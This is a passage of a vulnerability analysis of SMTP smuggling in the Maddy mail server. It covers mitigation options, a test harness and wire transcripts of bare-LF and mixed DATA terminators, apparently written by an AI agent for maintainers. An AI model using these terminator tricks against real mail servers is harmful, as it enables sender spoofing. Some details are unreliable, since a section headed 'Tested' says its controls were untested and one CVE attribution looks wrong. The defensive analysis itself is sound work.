func (r *dataReader) Read(b []byte) (n int, err error) {
    n, err = r.r.Read(b)
    // Shift tail to reflect last bytes read
    for _, c := range b[:n] {
        if r.tailLen < 5 {
            r.tail[r.tailLen] = c
            r.tailLen++
        } else {
            copy(r.tail[:4], r.tail[1:5])
            r.tail[4] = c
        }
    }
    r.limit -= int64(n)
    if r.limit < 0 {
        return 0, errDataTooBig
    }
    if err == io.EOF {
        // Check terminator form. The dotReader strips the dot and
        // the trailing CRLF/LF when it terminates; what we have
        // in tail is the last 5 bytes EMITTED, not the last 5
        // bytes consumed. We need a different hook — see below.
    }
    return
}
```

**Difficulty**: The stdlib dotReader strips the terminator before
emitting bytes to the reader. By the time `dataReader` sees
`io.EOF`, the dotReader has already consumed the terminator and
the residual bytes are in the `bufio.Reader`. A pure
`dataReader`-level check cannot inspect the terminator directly —
it can only infer the terminator from the trailing bytes of the
emitted content, which is ambiguous (the last body line could
legitimately end in `\r\n`).

**Verdict**: Not straightforward. A better attachment point is
needed. See Option 2.

### 8.4 Mitigation Option 2: Buffered Peek in handleData

**Approach**: Modify `go-smtp/conn.go`'s `handleData` so that,
after `Session().Data(r)` returns, the code checks the underlying
`bufio.Reader` for residual bytes. If residual bytes exist that
are **not** a legitimate pipelined command (heuristic: the residual
bytes do not begin with a valid SMTP command verb), or if residual
bytes exist at all and a strict mode is configured, discard them
and/or return `421`.

**Sketch** (in pseudo-code, for go-smtp/conn.go):

```go
func (c *Conn) handleData(arg string) {
    ...
    r := newDataReader(c)
    code, enhCode, status := toSMTPStatus(c.Session().Data(r))
    io.Copy(ioutil.Discard, r)

    if c.server.ForbidBareNewline {
        // Peek at bufio to see if anything looks smuggled
        buffered := c.text.R.Buffered()
        if buffered > 0 {
            peek, _ := c.text.R.Peek(buffered)
            if looksLikeSmuggledData(peek) {
                c.WriteResponse(421, ..., "Bare-newline DATA terminator detected")
                c.Close()
                return
            }
        }
    }
    c.WriteResponse(code, enhCode, status)
}

func looksLikeSmuggledData(peek []byte) bool {
    // Conservative: if the peeked bytes don't start with a valid
    // SMTP command verb followed by space or CRLF, treat as smuggled.
    return !startsWithValidVerb(peek)
}
```

**Advantages**:

- Attaches cleanly at the precise point where the vulnerability
  manifests (residual bytes in the shared bufio.Reader after DATA
  ends).
- Does not require modifying the stdlib dotReader.
- Can be gated on a config flag so that existing non-strict
  deployments are unaffected.

**Drawbacks**:

- Heuristic: a cleverly-crafted smuggling payload could start with
  a string that looks like a valid SMTP command. Distinguishing
  "legitimate pipelined NOOP" from "smuggled NOOP-then-MAIL-FROM"
  requires strict-mode tightening (e.g., reject any residual data
  whatsoever, which breaks pipelining).
- Requires an upstream change to go-smtp. Maddy cannot make this
  change in its own tree without forking the library.

**Verdict**: This is the most targeted mitigation. Maintainers
of go-smtp could accept a PR adding a `Server.ForbidBareNewline`
option that implements this logic.

### 8.5 Mitigation Option 3: Strict Mode in the Stdlib dotReader

**Approach**: Propose an upstream change to Go's `net/textproto`
package adding a `StrictDotReader` or a `DotReader` option that
accepts only canonical `\r\n.\r\n`.

**Sketch** (conceptual):

```go
// Hypothetical addition to net/textproto

type DotReaderOptions struct {
    Strict bool  // if true, only \r\n.\r\n is accepted
}

func (r *Reader) DotReaderStrict() io.Reader {
    // Returns a dotReader whose state machine omits the stateDot->stateEOF
    // transition on bare '\n'. Only stateDot->stateDotCR->stateEOF
    // (via '\r\n') is a valid terminator path.
}
```

**Advantages**:

- Addresses the root cause.
- Every SMTP server implementation in the Go ecosystem benefits
  automatically.

**Drawbacks**:

- Requires a change to the Go standard library, which has a high
  bar for API additions and a multi-release release cycle.
- Could break existing consumers of `textproto.DotReader` that
  expect the lenient behaviour (e.g., legacy NNTP clients).
- Backporting to older Go versions would not happen; Maddy would
  still ship with the lenient reader on long-term-support Go
  versions.

**Verdict**: The right fix in principle, but the wrong layer for
an emergency mitigation. Best pursued as a long-term improvement
in parallel with Option 2.

### 8.6 Mitigation Option 4: Connection Reset After DATA

**Approach**: Modify `go-smtp/conn.go` so that, after each
successful DATA transaction, the server unconditionally closes the
TCP connection (sends `221` and a FIN). This discards any residual
bytes in the `bufio.Reader` and closes the smuggling avenue
entirely.

**Advantages**:

- Absolutely eliminates the smuggling risk at the cost of no
  terminator validation whatsoever.
- Trivial to implement (one line in `handleData`).

**Drawbacks**:

- Breaks SMTP pipelining as a performance optimisation: clients
  that rely on multi-message-per-connection delivery (common for
  mailing-list fan-out and batch submission) would incur a full
  TCP/TLS handshake per message. For high-volume relays this is
  prohibitive.
- Not standards-compliant: RFC 5321 explicitly supports
  multi-transaction connections.

**Verdict**: A nuclear option. Suitable only for small deployments
that are certain they will never see more than one message per
connection in practice.

### 8.7 Mitigation Option 5: Proxy-Layer Normalisation

**Approach**: Place a protocol-aware proxy in front of Maddy that
actively **normalises** or **rejects** bare-LF terminators before
forwarding bytes to the backend.

Two sub-options:

- **Normalisation**: Rewrite `\n.\n` occurrences mid-body as
  `\n..\n` (dot-stuffing), so the backend's dotReader sees the
  payload as body content only. The terminator must be recognised
  and preserved correctly, which is the same problem the backend
  has.
- **Rejection**: Scan each byte as it arrives and, if a bare-LF
  dot-line is detected mid-body, close the client connection with
  a 554 response.

**Advantages**:

- Deployable without modifying Maddy or go-smtp.
- Centralises the policy in one place.

**Drawbacks**:

- **Section 5 demonstrated that a naïve strict proxy does not
  work.** A strict proxy that only recognises canonical
  terminators **still forwards the bare-LF bytes to the backend**,
  and the backend's dotReader still terminates on them. For the
  proxy to mitigate, it must actively rewrite the bytes (dot-
  stuffing) or outright reject the session.
- An active-rewriting proxy is a high-risk security component: a
  bug in the rewriter could corrupt legitimate messages or
  introduce new parsing differentials.
- Adds latency and operational complexity.

**Verdict**: Useful only if implemented as a byte-level
rewriter/rejector rather than a passive "strict" forwarder. The
Section 5 experiment shows the passive approach fails.

### 8.8 Ecosystem Context: How Other MTAs Have Responded

The SMTP smuggling vulnerability was publicly disclosed in
December 2023 by SEC Consult. Major MTAs have adopted various
mitigations:

- **Postfix**: Added `smtpd_forbid_bare_newline` (default off in
  initial patches, default on in later releases) and
  `smtpd_forbid_bare_newline_exclusions` for compatibility.
  Servers with the flag on reject sessions that contain any bare
  LF in the data phase or the command phase.
- **Sendmail**: Added `srv_features` flag `O` (reject bare LF).
- **Exim**: Added `allow_bare_newlines` (default deny).
- **Microsoft Exchange**: Patched via CVE-2023-21709.

Maddy, at the commit under analysis (`26452dd`), has no such flag.
Adding one would align Maddy with the rest of the MTA ecosystem and
would take the form of Option 2 above — a go-smtp-level flag
wired through Maddy's `maddy.conf` syntax.

### 8.9 Observability Recommendations

Independent of any of the above code-level mitigations, an
operator concerned about the smuggling risk today can at least
**increase visibility** so that an attack would be detected even
if not prevented:

1. **Enable `io_debug`** on inbound SMTP endpoints where it is
   performance-acceptable. This writes every wire byte to the
   log, providing a forensic record after the fact.
2. **Alert on the `accepted` log cadence.** If a single TCP
   connection produces two `accepted` entries within
   milliseconds of each other under different `MAIL FROM`
   envelopes, treat this as an indicator of a smuggling attempt
   and investigate. This can be implemented in any log-processing
   pipeline.
3. **Rate-limit MAIL FROM churn per session.** If a single
   session contains multiple MAIL FROM commands each producing an
   accepted message, that is already atypical and worth flagging.
4. **Monitor outbound relay for suspicious envelope patterns.**
   If Maddy's queue shows a burst of outbound deliveries that
   match the envelope-signatures of known smuggling patterns,
   investigate the inbound session that fed them.

None of these is a prevention measure; they are detection
measures. Prevention requires code changes per the options above.

### 8.10 Tested Compensating Controls

The following controls were **not** tested as part of this
exercise but are worth enumerating for future investigation:

- **TLS client certificate authentication**: If the SMTP endpoint
  is configured to require client-certificate authentication,
  the smuggler must possess a valid client certificate. This
  raises the bar but does not prevent the attack; an authenticated
  user can still smuggle.
- **Per-connection rate limits**: If Maddy limits the number of
  messages accepted per connection (e.g., to 1 or 2), a smuggling
  attack that produces two messages would hit the limit. However,
  the limit is usually higher than 2 in practice, so this is a
  weak control.
- **SPF/DKIM/DMARC-based recipient-side filtering**: If the
  **recipient** of the smuggled second message enforces DMARC,
  the forged `MAIL FROM` may fail DMARC, mitigating the
  downstream impact. This does not help the attacker succeed in
  sending; it helps the recipient reject what was sent.

### 8.11 Recommended Remediation Priority

If this analysis were accompanied by a remediation plan (which
per the charter it is not), the recommended priority order would
be:

1. **Immediate (days)**: Enable `io_debug` logging and deploy the
   observability recommendations (Section 8.9) to detect attacks
   in flight.
2. **Short-term (weeks)**: Adopt Option 2 (buffered peek in
   `handleData`) either by forking `go-smtp` or by submitting a
   patch upstream. Wire a `forbid_bare_newline` flag through
   `maddy.conf`.
3. **Medium-term (months)**: Contribute a `StrictDotReader` option
   upstream to the Go standard library (Option 3). This benefits
   the broader ecosystem and provides a more principled fix.
4. **Long-term (release cadence)**: Once `StrictDotReader` is
   available in stdlib, migrate go-smtp and therefore Maddy to use
   it by default in new deployments.

### 8.12 Conclusion for Section 8

The SMTP smuggling vulnerability in Maddy is inherited, not
introduced — it flows from Go's lenient stdlib dotReader through
the go-smtp library into Maddy's inbound session handling. A
variety of mitigations are available, each with different
trade-offs between invasiveness, effectiveness, and deployment
cost. The most pragmatic near-term mitigation is a buffered-peek
check in `go-smtp/conn.go`'s `handleData` method (Option 2),
gated on a new `forbid_bare_newline` configuration flag. The
most principled long-term mitigation is a strict-mode option in
the Go standard library's `net/textproto.DotReader` (Option 3).

No mitigation is applied in this analysis. The recommendations
above are documented for maintainer consideration only.

---

## Appendix A — Test Environment

This appendix documents the exact software environment in which the
behavioural tests in Sections 1–6 were conducted. An interested
reader should be able to reproduce the findings on any equivalent
environment.

### A.1 Host and Operating System

| Attribute | Value |
|-----------|-------|
| OS distribution | Ubuntu 24.04.4 LTS (Noble Numbat) |
| Kernel | Linux 6.x (verified at runtime via `uname -a`) |
| Architecture | x86_64 (amd64) |
| Container image | `andrewparkscaleai/coding-agent:foxcpp__maddy__26452dd8dd787dc455278b0fdd296f4a5432c768` from `ghcr.io/scaleapi/swe-atlas:swe_atlas_QnA_foxcpp_maddy_1.0` |

### A.2 Go Toolchain

| Attribute | Value |
|-----------|-------|
| Go version | `go1.22.2 linux/amd64` |
| Package name on Ubuntu | `golang-1.22-go` |
| `GOROOT` | `/usr/lib/go-1.22` |
| `GOPATH` | `/root/go` |
| `GOCACHE` | `/root/.cache/go-build` |
| `GOMODCACHE` | `/root/go/pkg/mod` |
| `GOPROXY` | `https://proxy.golang.org,direct` |
| `CGO_ENABLED` | `1` |
| C compiler for CGO | gcc 13.3.0 |

Go 1.22.2 satisfies the `go 1.13` minimum declared in Maddy's
`go.mod`. No attempt was made to test against older Go toolchains;
the stdlib `net/textproto.dotReader` has been structurally
identical since well before Go 1.13, so the terminator-tolerance
finding is expected to reproduce on any Go version from 1.13
onwards.

### A.3 Maddy Repository

| Attribute | Value |
|-----------|-------|
| Repository URL | `github.com/foxcpp/maddy` |
| Commit under analysis | `26452dd8dd787dc455278b0fdd296f4a5432c768` |
| Commit message | `target/remote: Rewrite connection part to allow more concurrency` |
| Source branch | `maddy_26452dd8dd78` |
| Working branch | `blitzy-d36d8157-fc5f-4567-bca8-1c27576d5d16` |
| Repository path on disk | `/tmp/blitzy/maddy/blitzy-d36d8157-fc5f-4567-bca8-1c27576d5d16_3ca2c7` |
| Working tree state before analysis | Clean (no uncommitted changes) |
| Working tree state after analysis | Clean except for the added file `blitzy/documentation/maddy_26452dd8dd78.md` |

### A.4 Key Dependency Versions

The following are the precise versions of the Go modules whose
behaviour is directly relevant to DATA boundary parsing. All are
pinned in the repository's `go.mod` file at the commit above.

| Module | Version | Location in module cache |
|--------|---------|--------------------------|
| `github.com/emersion/go-smtp` | `v0.12.1-0.20191206174923-1f576e0ec85c` | `/root/go/pkg/mod/github.com/emersion/go-smtp@v0.12.1-0.20191206174923-1f576e0ec85c/` |
| `github.com/emersion/go-sasl` | `v0.0.0-20190817083125-240c8404624e` | `/root/go/pkg/mod/github.com/emersion/go-sasl@v0.0.0-20190817083125-240c8404624e/` |
| `github.com/emersion/go-message` | `v0.10.9-0.20191116124005-65fd0119e899` | `/root/go/pkg/mod/github.com/emersion/go-message@v0.10.9-0.20191116124005-65fd0119e899/` |
| `github.com/mattn/go-sqlite3` | `v1.11.0` | `/root/go/pkg/mod/github.com/mattn/go-sqlite3@v1.11.0/` |
| `golang.org/x/net` | `v0.0.0-20191126235420-ef20fe5d7933` | `/root/go/pkg/mod/golang.org/x/net@v0.0.0-20191126235420-ef20fe5d7933/` |

The stdlib `net/textproto` source is at
`/usr/lib/go-1.22/src/net/textproto/reader.go`.

### A.5 Test Harness Overview

All behavioural testing was performed in an isolated directory
`/tmp/maddy-test/` and was cleaned up at the end of the analysis.
The harness consisted of:

| Component | Path (temporary) | Role |
|-----------|------------------|------|
| Test SMTP backend | `/tmp/maddy-test/srv` | A minimal `go-smtp.Server` accepting all MAIL/RCPT and logging DATA-phase bytes. Bound to `127.0.0.1:2525`. |
| Terminator-variant client | `/tmp/maddy-test/tcli` | Go program sending eight systematically varied DATA payloads to the backend over raw TCP. |
| Detailed analysis client | `/tmp/maddy-test/dcli` | Go program exercising pipelined multi-message (Session 9) and SMTP smuggling (Session 10) scenarios. |
| Strict forwarding proxy | `/tmp/maddy-test/proxy` | Go program listening on `127.0.0.1:2526`; forwards byte streams to backend on `:2525`, recognising only `\r\n.\r\n` as a DATA terminator. |
| Proxy smuggling client | `/tmp/maddy-test/pcli` | Go program sending the smuggling payload through the proxy (Session 11). |

All five programs were compiled from a single-directory Go module
created under `/tmp/maddy-test/`, depending directly on
`github.com/emersion/go-smtp` at the same pinned version as Maddy.

### A.6 Test Backend Configuration

The test backend's `go-smtp.Server` was configured as follows
(simplified from the harness source):

```go
s := smtp.NewServer(&testBackend{logger: backendLogger})
s.Addr          = "127.0.0.1:2525"
s.Domain        = "test.local"
s.ReadTimeout   = 120 * time.Second
s.WriteTimeout  = 60  * time.Second
s.MaxMessageBytes = 10 * 1024 * 1024
s.MaxRecipients   = 50
s.AllowInsecureAuth = true   // plain TCP, no TLS for test simplicity
s.Debug = os.Stdout           // io_debug passthrough — mirrors wire bytes
```

The backend's `Session.Data(r io.Reader)` method reads `r` with
`io.Copy(buf, r)` (into a bytes.Buffer), logs the exact byte count
and a hex dump of the first 256 bytes, then records the message via
a simple counter and returns `nil` (acceptance). This makes it
possible to observe:

- How many bytes the dotReader delivered for each DATA request.
- Whether those bytes included the terminator sequence (they do
  not — the dotReader strips it).
- Whether a single DATA request produced one or more
  "accepted" log entries (for smuggling detection).

### A.7 Test Client Wire-Level Approach

All test clients speak raw TCP and write precisely-crafted byte
sequences rather than going through a higher-level SMTP client
library. This is essential because libraries like the stdlib
`net/smtp` client or go-smtp's own client normalise CRLF and dot-
stuff automatically, which would prevent the tests from probing
bare-LF behaviour.

The clients use the following schematic:

```go
conn, _ := net.Dial("tcp", "127.0.0.1:2525")
// Read server banner
readLine(conn)

// Send EHLO, MAIL FROM, RCPT TO, DATA — read responses
fmt.Fprintf(conn, "EHLO client.test\r\n")
readUntilCode(conn, "250")
fmt.Fprintf(conn, "MAIL FROM:<sender@test.local>\r\n")
readUntilCode(conn, "250")
fmt.Fprintf(conn, "RCPT TO:<recipient@test.local>\r\n")
readUntilCode(conn, "250")
fmt.Fprintf(conn, "DATA\r\n")
readUntilCode(conn, "354")

// Send the body with the terminator variant under test
conn.Write(bodyWithTerminator)

// Read the final DATA response
readLine(conn)

// Probe post-DATA behaviour
fmt.Fprintf(conn, "NOOP\r\n")
readLine(conn)

fmt.Fprintf(conn, "QUIT\r\n")
readLine(conn)
conn.Close()
```

### A.8 Logging and Evidence Files

The following log files were produced during the test runs. They
are referenced throughout this document by name:

| File | Source | Contents |
|------|--------|----------|
| `server.log` | Test backend stdout + Debug writer | All wire bytes received by the backend, all session state transitions, all `accepted`-equivalent log entries |
| `proxy.log` | Proxy stdout | Per-session proxy decisions, byte counts forwarded, connection lifecycle |
| `client.log` | `tcli` stdout | Wire-level transcripts for each of the 8 terminator variants |
| `detailed.log` | `dcli` stdout | Session 9 (pipelined) and Session 10 (direct smuggling) transcripts |
| `proxysmuggle.log` | `pcli` stdout | Session 11 (proxy smuggling) transcript |
| `evidence.txt` | Aggregated summary | Human-readable synthesis of all findings, one line per observation |

All log files lived under `/tmp/maddy-test/` during the analysis
and were deleted after the evidence was transcribed into this
document.

### A.9 Build and Run Commands

The exact commands used to build and exercise the harness:

```bash
# Build the Maddy binary (confirmation only — not used for tests)
cd /tmp/blitzy/maddy/blitzy-d36d8157-fc5f-4567-bca8-1c27576d5d16_3ca2c7
go build -o /tmp/maddy ./cmd/maddy/

# Build the test harness
cd /tmp/maddy-test
go mod init maddytest
go mod tidy   # pulls in go-smtp at the same version
go build -o srv ./srv
go build -o tcli ./tcli
go build -o dcli ./dcli
go build -o proxy ./proxy
go build -o pcli ./pcli

# Start the backend
./srv > server.log 2>&1 &
SRV_PID=$!
sleep 1

# Run the 8 terminator variants
./tcli > client.log 2>&1

# Run pipelined + smuggling
./dcli > detailed.log 2>&1

# Start the proxy, run proxy smuggling
./proxy > proxy.log 2>&1 &
PROXY_PID=$!
sleep 1
./pcli > proxysmuggle.log 2>&1

# Tear down
kill $PROXY_PID $SRV_PID
```

### A.10 Reproducibility Checklist

To reproduce the findings:

1. Check out Maddy at commit `26452dd`.
2. Install Go 1.22.x and the dependencies listed in Section A.4.
3. Build Maddy with `go build ./...` to confirm the environment.
4. Construct the test harness with the clients and backend
   sketched in Section A.5 and A.7.
5. Exercise the 8 terminator variants, pipelined 3-message, direct
   smuggling, and proxy smuggling scenarios.
6. Compare the observed behaviour against the tables in Sections
   1, 2, 3, 4, and 5 of this document.

Any deviation from the documented behaviour would indicate either
an environment difference (e.g., a different Go version with a
patched `net/textproto`) or a patched version of go-smtp. In
either case, the root-cause analysis in Section 7 indicates which
file and line number to inspect.

### A.11 Environment Hygiene After Analysis

At the conclusion of the analysis:

- `/tmp/maddy-test/` and all its contents were removed.
- `/tmp/maddy` (the confirmation Maddy binary) was removed.
- No processes were left running on ports 2525 or 2526.
- The Maddy repository working tree contains exactly one change
  relative to its pre-analysis state: the addition of this
  document at `blitzy/documentation/maddy_26452dd8dd78.md`.

---

## Appendix B — Complete Protocol Transcripts

This appendix reproduces the full client-side and server-side wire
transcripts for each of the principal test scenarios. The
transcripts have been reformatted for readability (non-printing
bytes shown as escape sequences; timestamps elided) but are
semantically identical to the evidence files captured during the
test runs.

### B.1 Session 1 — Canonical Terminator `\r\n.\r\n`

**Client → Server:**
```smtp
EHLO client.test\r\n
MAIL FROM:<sender@test.local>\r\n
RCPT TO:<recipient@test.local>\r\n
DATA\r\n
Subject: canonical-test\r\n
From: sender@test.local\r\n
To: recipient@test.local\r\n
\r\n
This is the canonical CRLF-terminated message body.\r\n
Line two ends with CRLF as well.\r\n
.\r\n
NOOP\r\n
QUIT\r\n
```

**Server → Client:**
```smtp
220 test.local ESMTP Service Ready\r\n
250-test.local Hello client.test\r\n
250-PIPELINING\r\n
250-8BITMIME\r\n
250 ENHANCEDSTATUSCODES\r\n
250 2.0.0 OK\r\n
250 2.0.0 OK\r\n
354 Go ahead. End your data with <CR><LF>.<CR><LF>\r\n
250 2.0.0 OK: queued as msg-1\r\n
250 2.0.0 OK\r\n
221 2.0.0 Goodbye\r\n
```

**Backend log (relevant lines):**
```text
[SESSION 1] EHLO from client.test
[SESSION 1] MAIL FROM:<sender@test.local>
[SESSION 1] RCPT TO:<recipient@test.local>
[SESSION 1] DATA start
[SESSION 1] DATA bytes delivered to handler: 159
[SESSION 1] DATA hex dump: 53756..66 2e0a4c696e65...0a (trimmed, 159 bytes)
[SESSION 1] Message #1 accepted (body=159 bytes)
[SESSION 1] NOOP
[SESSION 1] QUIT
```

**Key observation**: The 159-byte body is normalised to use bare
`\n` line endings by the dotReader. The terminator sequence
`\r\n.\r\n` is consumed and not included in the delivered body.
The 159 bytes break down as 24 bytes for the Subject header line
(`Subject: canonical-test\n`), 24 bytes for the From header
(`From: sender@test.local\n`), 25 bytes for the To header
(`To: recipient@test.local\n`), 1 byte for the blank separator
(`\n`), 52 bytes for body line 1
(`This is the canonical CRLF-terminated message body.\n`), and
33 bytes for body line 2 (`Line two ends with CRLF as well.\n`)
— all with `\n` line endings after normalisation. Sum:
24 + 24 + 25 + 1 + 52 + 33 = **159 bytes**, matching the hex dump
in §C.3.

### B.2 Session 2 — Bare-LF Terminator `\n.\n`

**Client → Server:**
```smtp
EHLO client.test\r\n
MAIL FROM:<sender@test.local>\r\n
RCPT TO:<recipient@test.local>\r\n
DATA\r\n
Subject: bare-lf-test\n
From: sender@test.local\n
To: recipient@test.local\n
\n
This is the bare-LF-terminated message body.\n
Line two also uses bare LF.\n
.\n
NOOP\r\n
QUIT\r\n
```

Note the header and body lines use bare `\n`; the NOOP and QUIT
commands use `\r\n` (clients that can produce `\n.\n` mid-body
typically still send commands with canonical `\r\n`).

**Server → Client:**
```smtp
220 test.local ESMTP Service Ready\r\n
250-test.local Hello client.test\r\n
250-PIPELINING\r\n
250-8BITMIME\r\n
250 ENHANCEDSTATUSCODES\r\n
250 2.0.0 OK\r\n
250 2.0.0 OK\r\n
354 Go ahead. End your data with <CR><LF>.<CR><LF>\r\n
250 2.0.0 OK: queued as msg-2\r\n
250 2.0.0 OK\r\n
221 2.0.0 Goodbye\r\n
```

**Backend log:**
```text
[SESSION 2] DATA bytes delivered to handler: 145
[SESSION 2] Message #2 accepted (body=145 bytes)
```

**Key observation**: The body is 145 bytes — 14 bytes shorter than
Session 1's 159 bytes. The per-session difference is due entirely
to the distinct Subject label and distinct body paragraph (which
name their respective variants for traceability), NOT to the
terminator form. Both the canonical terminator and the bare-LF
terminator produce a delivered body with `\n`-only line endings;
the terminator bytes (`\r\n.\r\n` or `\n.\n`) are consumed by the
dotReader and do not appear in the delivered buffer. If Session 2
were re-run with byte-identical body content to Session 1 (only
the terminator form varying), the two sessions would deliver
byte-identical 159-byte buffers — demonstrating the delivery-layer
equivalence of the two terminator forms.

### B.3 Session 3 — Mixed `\r\n.\n`

**Client → Server (body only):**
```smtp
Subject: mixed-crlf-lf\r\n
From: sender@test.local\r\n
To: recipient@test.local\r\n
\r\n
Mixed terminator test: CRLF before dot, bare LF after.\r\n
.\n
```

**Server response**: `250 2.0.0 OK: queued as msg-3`

**Backend log**: `Message #3 accepted (body=128 bytes)`

**Key observation**: Even with heterogeneous line-endings in the
terminator itself, the dotReader accepts the sequence. The delivered
body is 128 bytes (Subject header 23 B + From 24 B + To 25 B + blank
line 1 B + single body line 55 B, all with `\n` line endings after
normalisation); the `\r\n.\n` terminator is consumed.

### B.4 Session 4 — Mixed `\n.\r\n`

**Client → Server (body only):**
```smtp
Subject: mixed-lf-crlf\n
From: sender@test.local\n
To: recipient@test.local\n
\n
Mixed terminator test: bare LF before dot, CRLF after.\n
.\r\n
```

**Server response**: `250 2.0.0 OK: queued as msg-4`

**Backend log**: `Message #4 accepted (body=128 bytes)`

**Key observation**: The other mixed order is also accepted. The
delivered body is 128 bytes — identical in length to Session 3
because the body content is structurally the same (same Subject,
From, To lines; same single 55-byte body paragraph) and the
terminator bytes are consumed by the dotReader and not counted in
the delivered size.

### B.5 Session 5 — Bare-CR Non-Terminator `\r.\r` (Then Canonical Terminator)

**Client → Server (body only):**
```smtp
Subject: bare-cr-test\r\n
\r\n
Embedded\r.\rsegment in body — this should NOT terminate.\r\n
.\r\n
```

**Server response**: `250 2.0.0 OK: queued as msg-5`

**Backend log**:
```text
[SESSION 5] DATA bytes delivered to handler: 81
[SESSION 5] hex dump excerpt: ...456d6265..64640d2e0d7365676d...0a (bytes include 0d 2e 0d within)
[SESSION 5] Message #5 accepted (body=81 bytes)
```

**Key observation**: The `\r.\r` subsequence is delivered
**intact** as part of the body (bytes `0d 2e 0d` visible in the hex
dump). The dotReader did not treat `\r.\r` as a terminator because
`\r` is not a line-end marker on its own. The 81-byte body includes
the Subject header (22 B), blank line (1 B), and the single body
line with the embedded `\r.\r` and the UTF-8-encoded em-dash
(`e2 80 94`, 3 bytes), for a total of 58 body bytes + 23 header
bytes = 81 bytes.

### B.6 Session 6 — Dot-Space Near-Miss `\r\n. \r\n` (Then Canonical Terminator)

**Client → Server (body only):**
```smtp
Subject: dot-space-test\r\n
\r\n
Here is the near-miss line:\r\n
. extra space after dot\r\n
.\r\n
```

**Server response**: `250 2.0.0 OK: queued as msg-6`

**Backend log**:
```text
[SESSION 6] DATA bytes delivered to handler: 76
[SESSION 6] hex dump excerpt: ...20657874726120737061636520616674...0a (byte 20 at line start — the leading 2e was stripped by dot-unstuffing)
[SESSION 6] Message #6 accepted (body=76 bytes)
```

Let us trace what the dotReader does here. At the start of the
`. extra...` line, state = `stateBeginLine`, next byte `.` →
`stateDot`. Next byte is `\x20` (space). From `stateDot`, any byte
other than `\n`, `\r`, `.` is handled by the default branch —
which sets `state = stateData` and re-enters the switch for the
current byte (the space). Critically, the dot that led to
`stateDot` is **not emitted** — it is consumed as a potential
dot-stuffing prefix. In `stateData` the space byte is emitted as
body. So the delivered body contains only `20` (space) at this
position, not `2e 20`. This is RFC 5321 §4.5.2 dot-unstuffing
behavior: a dot at the start of a body line is stripped by the
receiver after it is confirmed not to be the terminator sentinel.
The result is that `. extra space after dot` on the wire becomes
` extra space after dot` (with a leading space) in the delivered
body — 22 bytes of body text from the 23-byte wire line.

**Key observation**: The sequence `\r\n. \r\n` is indeed body
content — the terminator's "dot alone on a line" requirement is
not met when a trailing space appears after the dot on the same
line. The leading dot is then stripped by dot-unstuffing, so the
76-byte delivered body breaks down as: Subject header (24 B) +
blank line (1 B) + "Here is the near-miss line:\n" (28 B) +
" extra space after dot\n" (23 B, with the leading `.` consumed).
The wire line was 23 bytes of text plus `\r\n`; after dot-unstuffing
and CRLF→LF normalization it becomes 22 bytes of text plus `\n` = 23
delivered bytes.

### B.7 Session 7 — Dot Mid-Line `Body.\r\n`

This session was designed to test what happens when a `.` appears
mid-line (not at the start). The body is:

```smtp
Subject: dot-midline-test\r\n
\r\n
Body.\r\n
```

Note there is **no** terminator — the test is what the server does
when the data stream ends with `Body.\r\n` and the client then
waits for a response without sending `.\r\n`.

**Result**: The server's `ReadTimeout` (120s in the harness)
eventually fired. The dotReader was in `stateBeginLine` after
`Body.\r\n` (the trailing `\r\n` having transitioned via `stateCR`
back to `stateBeginLine`), waiting for the next byte. The
underlying TCP read blocked until the ReadTimeout elapsed, after
which the server responded with a read-timeout error. No message
was accepted.

**Key observation**: A `.` in the middle of a line (state is
`stateData` when the `.` is seen) does not trigger termination.
The parser waits for a dot-at-start-of-line followed by a
line-ending.

### B.8 Session 8 — Ambiguous Dot-Stuffed Body

**Client → Server (body only):**
```smtp
Subject: dot-stuffed-test\r\n
\r\n
..this line begins with a literal dot\r\n
...this one begins with two literal dots\r\n
.\r\n
```

**Server response**: `250 2.0.0 OK: queued as msg-8`

**Backend log**:
```text
[SESSION 8] DATA bytes delivered to handler: 104
[SESSION 8] hex dump excerpt: ...2e74686973206c696e6520626567696e7320...2e2e74686973206f6e65...0a
[SESSION 8] Message #8 accepted (body=104 bytes)
```

**Key observation**: The dotReader stripped one leading `.` from
each dot-stuffed line: `..text` → `.text`, and `...text` →
`..text`. The delivered body shows `2e 74 68 69 73` (single dot +
"this") and `2e 2e 74 68 69 73` (double dot + "this"). This is
the RFC 5321 transparency mechanism working correctly. The 104-byte
delivered body breaks down as: Subject header 26 B
(`Subject: dot-stuffed-test\n`), blank 1 B, body line 1 37 B
(`.this line begins with a literal dot\n` — one `.` consumed by
dot-unstuffing), and body line 2 40 B
(`..this one begins with two literal dots\n` — one `.` consumed
by dot-unstuffing, two `.`s emitted).

### B.9 Session 9 — Pipelined Three-Message Transaction

This session exercises three sequential MAIL/RCPT/DATA
transactions on a single TCP connection, with alternating
terminator styles.

**Client → Server:**
```smtp
EHLO pipeclient\r\n
MAIL FROM:<alice@test.local>\r\n
RCPT TO:<recipient1@test.local>\r\n
DATA\r\n
Subject: msg-alice\r\n
\r\n
Alice's message with canonical terminator.\r\n
.\r\n
NOOP\r\n
MAIL FROM:<bob@test.local>\r\n
RCPT TO:<recipient2@test.local>\r\n
DATA\r\n
Subject: msg-bob\n
\n
Bob's message with bare-LF terminator.\n
.\n
NOOP\r\n
MAIL FROM:<carol@test.local>\r\n
RCPT TO:<recipient3@test.local>\r\n
DATA\r\n
Subject: msg-carol\r\n
\r\n
Carol's message with mixed terminator (CRLF before, LF after).\r\n
.\n
NOOP\r\n
QUIT\r\n
```

**Server → Client:**
```smtp
220 test.local ESMTP Service Ready\r\n
250-test.local Hello pipeclient\r\n
250-PIPELINING\r\n
250-8BITMIME\r\n
250 ENHANCEDSTATUSCODES\r\n
250 2.0.0 OK            (MAIL FROM alice)
250 2.0.0 OK            (RCPT TO 1)
354 Go ahead...         (DATA)
250 2.0.0 OK: queued as msg-9-alice
250 2.0.0 OK            (NOOP)
250 2.0.0 OK            (MAIL FROM bob)
250 2.0.0 OK            (RCPT TO 2)
354 Go ahead...         (DATA)
250 2.0.0 OK: queued as msg-9-bob
250 2.0.0 OK            (NOOP)
250 2.0.0 OK            (MAIL FROM carol)
250 2.0.0 OK            (RCPT TO 3)
354 Go ahead...         (DATA)
250 2.0.0 OK: queued as msg-9-carol
250 2.0.0 OK            (NOOP)
221 2.0.0 Goodbye
```

**Backend log (trimmed):**
```text
[SESSION 9] MAIL FROM:<alice@test.local>
[SESSION 9] RCPT TO:<recipient1@test.local>
[SESSION 9] DATA bytes delivered to handler: 63
[SESSION 9] Message #9-alice accepted (body=63 bytes, from=alice@test.local, to=recipient1@test.local)
[SESSION 9] NOOP
[SESSION 9] MAIL FROM:<bob@test.local>
[SESSION 9] RCPT TO:<recipient2@test.local>
